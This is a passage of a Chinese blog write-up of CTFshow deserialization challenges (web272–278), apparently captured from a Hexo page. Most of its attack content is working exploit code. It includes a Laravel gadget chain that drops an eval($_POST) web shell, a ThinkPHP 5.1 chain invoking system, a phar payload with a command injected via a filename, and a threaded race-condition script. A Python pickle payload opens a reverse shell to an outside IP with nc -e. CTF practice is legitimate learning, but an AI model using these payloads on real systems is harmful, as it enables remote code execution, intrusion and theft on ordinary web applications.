class="line">namespace PhpParser\Node\Scalar\MagicConst&#123;</span><br><span class="line">    class Line &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Generator&#123;</span><br><span class="line">    class MockDefinition</span><br><span class="line">    &#123;</span><br><span class="line">        protected $config;</span><br><span class="line">        protected $code;</span><br><span class="line"></span><br><span class="line">        public function __construct($config, $code)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;config = $config;</span><br><span class="line">            $this-&gt;code = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Mockery\Loader&#123;</span><br><span class="line">    class EvalLoader&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Bus&#123;</span><br><span class="line">    class Dispatcher</span><br><span class="line">    &#123;</span><br><span class="line">        protected $queueResolver;</span><br><span class="line">        public function __construct($queueResolver)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Foundation\Console&#123;</span><br><span class="line">    class QueuedCommand</span><br><span class="line">    &#123;</span><br><span class="line">        public $connection;</span><br><span class="line">        public function __construct($connection)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Illuminate\Broadcasting&#123;</span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line">        public function __construct($events, $event)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">            $this-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $line = new PhpParser\Node\Scalar\MagicConst\Line();</span><br><span class="line">    $mockdefinition = new Mockery\Generator\MockDefinition($line,&quot;&lt;?php file_put_contents(&#x27;/app/public/1.php&#x27;,&#x27;&lt;?php eval(\$_POST[1]);?&gt;&#x27;);&quot;);</span><br><span class="line">    $evalloader = new Mockery\Loader\EvalLoader();</span><br><span class="line">    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,&#x27;load&#x27;));</span><br><span class="line">    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);</span><br><span class="line">    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);</span><br><span class="line">    echo urlencode(serialize($pendingbroadcast));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h2><p>laravel5.8 反序列化漏洞</p>
+<p>还是上题的链子</p>
+<h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p>thinkphp5.1反序列化漏洞</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152925353.png" alt="image-20221216152925353"></p>
+<p>找到入口</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152931105.png" alt="image-20221216152931105"></p>
+<p>现成的poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think;</span><br><span class="line">abstract class Model&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    private $data = [];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;append = [&quot;lin&quot;=&gt;[&quot;calc.exe&quot;,&quot;calc&quot;]];</span><br><span class="line">        $this-&gt;data = [&quot;lin&quot;=&gt;new Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Request</span><br><span class="line">&#123;</span><br><span class="line">    protected $hook = [];</span><br><span class="line">    protected $filter = &quot;system&quot;;</span><br><span class="line">    protected $config = [</span><br><span class="line">        // 表单ajax伪装变量</span><br><span class="line">        &#x27;var_ajax&#x27;         =&gt; &#x27;_ajax&#x27;,</span><br><span class="line">    ];</span><br><span class="line">    function __construct()&#123;</span><br><span class="line">        $this-&gt;filter = &quot;system&quot;;</span><br><span class="line">        $this-&gt;config = [&quot;var_ajax&quot;=&gt;&#x27;lin&#x27;];</span><br><span class="line">        $this-&gt;hook = [&quot;visible&quot;=&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\process\pipes;</span><br><span class="line"></span><br><span class="line">use think\model\concern\Conversion;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files=[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Pivot extends Model</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo base64_encode(serialize(new Windows()));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>已经成功rce</p>
+<h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152947664.png" alt="image-20221216152947664"></p>
+<p>在于$evilfile为true还是false</p>
+<p>如果是true 就会执行</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216152955230.png" alt="image-20221216152955230"></p>
+<p>而刚好这个$filename是我们可控制的参数 所以 只要为true 就能rce</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153005355.png" alt="image-20221216153005355"></p>
+<h2 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h2><p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153011587.png" alt="image-20221216153011587"></p>
+<p>先生成phar包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class filter&#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $filecontent;</span><br><span class="line">    public $evilfile=true;</span><br><span class="line">    public $admin = true;</span><br><span class="line"></span><br><span class="line">    public function __construct($f=&#x27;&#x27;,$fn=&#x27;&#x27;)&#123;</span><br><span class="line">        $this-&gt;filename=&#x27;1;tac fla?.ph?&#x27;;</span><br><span class="line">        $this-&gt;filecontent=&#x27;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$phar = new Phar(&quot;lzerokx.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$o = new filter();</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>生成lzerokx.phar 内容如下</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153020923.png" alt="image-20221216153020923"></p>
+<p>然后编写poc脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">success = False</span><br><span class="line"># 读取phar包内容</span><br><span class="line">def getPhar(phar):</span><br><span class="line">    with open(phar, &quot;rb&quot;) as p:</span><br><span class="line">        return p.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 写入phar包内容</span><br><span class="line">def writePhar(url, data):</span><br><span class="line">    print(&quot;writing...&quot;)</span><br><span class="line">    requests.post(url, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 触发unlink的phar反序列化</span><br><span class="line">def unlinkPhar(url, data):</span><br><span class="line">    global success</span><br><span class="line">    print(&quot;unlinking...&quot;)</span><br><span class="line">    res = requests.post(url, data)</span><br><span class="line">    if &quot;ctfshow&quot; in res.text and success is False:</span><br><span class="line">        print(res.text)</span><br><span class="line">        success = True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    global success</span><br><span class="line">    url = &quot;http://1e983f91-bf2e-4076-bea5-1b1563cb6b04.challenge.ctf.show/&quot;</span><br><span class="line">    phar = getPhar(&quot;lzerokx.phar&quot;)</span><br><span class="line">    while success is False:</span><br><span class="line">        time.sleep(1)</span><br><span class="line">        w = threading.Thread(target=writePhar, args=(url + &quot;?fn=p.phar&quot;, phar))</span><br><span class="line">        u = threading.Thread(</span><br><span class="line">            target=unlinkPhar, args=(url + &quot;?fn=phar://p.phar/test&quot;, &quot;&quot;)</span><br><span class="line">        )</span><br><span class="line">        w.start()</span><br><span class="line">        u.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<h2 id="web277"><a href="#web277" class="headerlink" title="web277"></a>web277</h2><p>python 反序列化</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153028810.png" alt="image-20221216153028810"></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import os</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Lzerokx:</span><br><span class="line">    def sw(self):</span><br><span class="line">        print(self.show)</span><br><span class="line"></span><br><span class="line">    def __init__(self, show):</span><br><span class="line">        self.show = show</span><br><span class="line"></span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (</span><br><span class="line">            eval,</span><br><span class="line">            (&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc 47.92.170.143 6767 -e /bin/sh&#x27;).read()&quot;,),</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lk = Lzerokx(&quot;                    https://ctf.show&quot;)</span><br><span class="line"></span><br><span class="line">lzerokx_ser = pickle.dumps(lk)</span><br><span class="line">print(base64.b64encode(lzerokx_ser))</span><br></pre></td></tr></table></figure>
+
+<p>页面无回显</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153034910.png" alt="image-20221216153034910"></p>
+<p>考虑反弹shell</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153041737.png" alt="image-20221216153041737"></p>
+<p>成功拿到flag</p>
+<p><img src="/2022/12/16/CTFSHOW-web%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20221216153048845.png" alt="image-20221216153048845"></p>
+<h2 id="web278"><a href="#web278" class="headerlink" title="web278"></a>web278</h2><p>和上题一样</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag"># CTF刷题笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/11/07/CTFSHOW-web%E5%85%A5%E9%97%A8-SSRF/" rel="prev" title="CTFshow-web入门-ssrf">
+      <i class="fa fa-chevron-left"></i> CTFshow-web入门-ssrf
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web254"><span class="nav-number">1.</span> <span class="nav-text">web254</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web255"><span class="nav-number">2.</span> <span class="nav-text">web255</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web256"><span class="nav-number">3.</span> <span class="nav-text">web256</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web257"><span class="nav-number">4.</span> <span class="nav-text">web257</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web258"><span class="nav-number">5.</span> <span class="nav-text">web258</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web259"><span class="nav-number">6.</span> <span class="nav-text">web259</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web260"><span class="nav-number">7.</span> <span class="nav-text">web260</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web261"><span class="nav-number">8.</span> <span class="nav-text">web261</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web262"><span class="nav-number">9.</span> <span class="nav-text">web262</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web263"><span class="nav-number">10.</span> <span class="nav-text">web263</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web264"><span class="nav-number">11.</span> <span class="nav-text">web264</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web265"><span class="nav-number">12.</span> <span class="nav-text">web265</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web266"><span class="nav-number">13.</span> <span class="nav-text">web266</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web267"><span class="nav-number">14.</span> <span class="nav-text">web267</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web268"><span class="nav-number">15.</span> <span class="nav-text">web268</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web269"><span class="nav-number">16.</span> <span class="nav-text">web269</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web270"><span class="nav-number">17.</span> <span class="nav-text">web270</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web271"><span class="nav-number">18.</span> <span class="nav-text">web271</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web272"><span class="nav-number">19.</span> <span class="nav-text">web272</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web273"><span class="nav-number">20.</span> <span class="nav-text">web273</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web274"><span class="nav-number">21.</span> <span class="nav-text">web274</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web275"><span class="nav-number">22.</span> <span class="nav-text">web275</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web276"><span class="nav-number">23.</span> <span class="nav-text">web276</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web277"><span class="nav-number">24.</span> <span class="nav-text">web277</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web278"><span class="nav-number">25.</span> <span class="nav-text">web278</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lzer0Kx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Lzer0Kx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaobaiakai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xiaobaiakai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lzer0Kx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
